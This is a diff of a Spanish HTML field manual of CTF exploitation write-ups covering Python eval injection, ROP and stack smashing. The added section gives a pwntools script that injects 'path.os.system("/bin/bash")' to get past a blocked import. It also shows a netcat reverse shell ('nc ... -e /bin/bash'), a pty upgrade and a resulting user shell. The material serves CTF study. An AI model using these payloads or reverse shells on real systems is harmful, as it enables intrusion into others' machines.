@@ -35,7 +35,7 @@
 <p><a href="#refs_uno">1. Python input 'eval' function.</a></p>
 <p><a href="#refs_dos">2. ROP,NX habilitado, usando buffer para sobreescritura de EIP apuntando a función que llama a "/bin/bash" y función read().</a></p>
 <p><a href="#refs_tres">3. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></p>
-<p><a href="#refs_cuatro">4. Python input 'eval' function y "del" import.</a></p>
+<p><a href="#refs_cuatro">4. Python input 'eval' function y 'import' bloqueado</a></p>
 <h2 id="introduccion">Introducción</h2>
 <p>Recomiendo que se tome este manual como una referencia de los binarios que he ido realizando a lo largo del 2018 y posterior. 
 Realmente cada técnica esta dividida en <em>seis</em> apartados con lo mas resañable e interesante a la hora de usar el Exploiting-Reversing Field Manual como una referencia y consulta a la hora de estar explotando o reverseando un binario y ver la técnica usada, los comandos usados, un breve resumen de un informe mas detallado y el código del exploit de su desarrollo.
@@ -60,13 +60,12 @@ flag = <span style="color: #0000FF">&quot;xxxxxxxxxx&quot;</span>
   <span style="color: #000080; font-weight: bold">else</span>:
     <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Your lucky number is &quot;</span>, x - y
 </pre></div>
-
-<h4>[Tecnica]:</h4>
-Importaremos <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code>
+<h4>[Técnica]:</h4>
+Importaremos <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code>. La función <code>input()</code> es vulnerable debido a que es equivalente a <code>eval(raw_input)</code>.
 <h4>[Informe]:</h4>
-Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. 
+Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input()</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. 
 <p><em><strong>Obtención de root shell</strong></em></p>
-El binario vulnerable esta ejecutandose en el servidor victima en el puerto 1234.
+El binario vulnerable esta ejecutandose en el servidor victima en el puerto <code>4444</code>.
 <pre><code>root@kali:~/Desktop# nc -lvnp 4444 | python task1.py
 listening on [any] 4444 ...
 Welcome to mystery math!
@@ -108,7 +107,7 @@ p.interactive()
 <h2><a id="refs_dos" href="#refs_dos">2. ROP,NX habilitado, usando buffer para sobreescritura de EIP apuntando a función que llama a "/bin/bash" y función read().</a></h2>
 <h4>[Resumen]:</h4>
 Tenemos que explotar un ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado.
-<h4>[Tecnica]:</h4>
+<h4>[Técnica]:</h4>
 ROP usando un buffer para la sobreescritura de EIP apuntando a la función <code>not_called()</code> y ejecutar un <code>/bin/bash</code> protegido con NX habilitado.
 <h4>[Informe]:</h4>
 <p><em><strong>Recolección de información</strong></em></p>
@@ -201,7 +200,7 @@ p.interactive()
 <h2><a id="refs_tres" href="#refs_tres">3. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
 <h4>[Resumen]:</h4>
 Tenemos que explotar un Buffer Overflow protegido con un stack canary float value.
-<h4>[Tecnica]:</h4>
+<h4>[Técnica]:</h4>
 Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary).
 <h4>[Informe]:</h4>
 <p><em><strong>Recolección de información</strong></em></p>
@@ -433,7 +432,7 @@ p.interactive()
 </div>
 <h4>[URL Reto]:</h4>
 <a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a>
-<h2><a id="refs_cuatro" href="#refs_cuatro">4. Python input 'eval' function y "del" import.</a></h2>
+<h2><a id="refs_cuatro" href="#refs_cuatro">4. Python input 'eval' function y 'import' bloqueado.</a></h2>
 <h4>[Resumen]:</h4>
 Tenemos que explotar la función vulnerable input para obtener una shell.
 Código:
@@ -469,8 +468,47 @@ choices = (
   show_menu()
   print_description(input(<span style="color: #0000FF">&#39;&gt; &#39;</span>))
 </pre></div>
-
-<h4>[Tecnica]:</h4>
-No podremos importar <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code>, por tanto deberemos pensar en otro bypass.
+<h4>[Técnica]:</h4>
+Referencia al módulo <code>OS</code> usando <code>path</code> y obtención de una shell.
 <h4>[Informe]:</h4>
-Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. 
+Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. No podremos importar <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code> debido a que esta bloqueado y no será tan fácil llamar una shell, por tanto deberemos pensar en otro bypass. Viendo lo que importa <code>path</code> vemos que tiene una referencia a <code>OS</code> así que podremos ejecutar una shell!.
+<p><em><strong>Obteniendo user shell</strong></em></p>
+Tenemos un server que esta ejecutando el script en el puerto <code>4444</code>.
+<pre><code>$ nc -lvp 4444 | python task5.py
+listening on [any] 4444 ...
+Welcome to the food menu!
+Which description do you want to read?
+[ 0] $ 7.69 Chicken Asada Burrito
+[ 1] $ 6.69 Beef Chow Mein
+[ 2] $ 10.49 MeatBurger Deluxe
+192.168.32.142: inverse host lookup failed: Unknown host
+connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 39348
+</code></pre>
+En la máquina atacante ejecutamos el exploit (ver:exploit). Y seguidamente nos conectamos a nosotros mismos por el puerto donde esta escuchando nuestro listener.
+<pre><code>naivenom@parrot:[~/pwn/python_eval] $ python exploit2.py 
+[+] Opening connection to 192.168.32.129 on port 4444: Done
+[*] Switching to interactive mode
+$ nc 192.168.32.142 1234 -e /bin/bash
+</code></pre>
+Nuestro Netcat a la escucha.
+<pre><code>naivenom@parrot:[~/fwr/dev] $ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.32.142] from (UNKNOWN) [192.168.32.129] 45560
+id
+uid=998(guille) gid=997(guille) grupos=997(guille)
+python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+<h4>[Exploit Development]:</h4>
+<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *
+
+<span style="color: #000080; font-weight: bold">def</span> exploit(data):
+    <span style="color: #000080; font-weight: bold">global</span> p
+    p.sendline(data)
+
+p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">4444</span>)
+
+exploit(<span style="color: #0000FF">&#39;path.os.system(&quot;/bin/bash&quot;)&#39;</span>)
+p.interactive()
+</pre></div>
+<h4>[URL Reto]:</h4>
+<a href="https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/python-eval-3">--PYTHON EVAL3 PICO CTF 2013--</a>
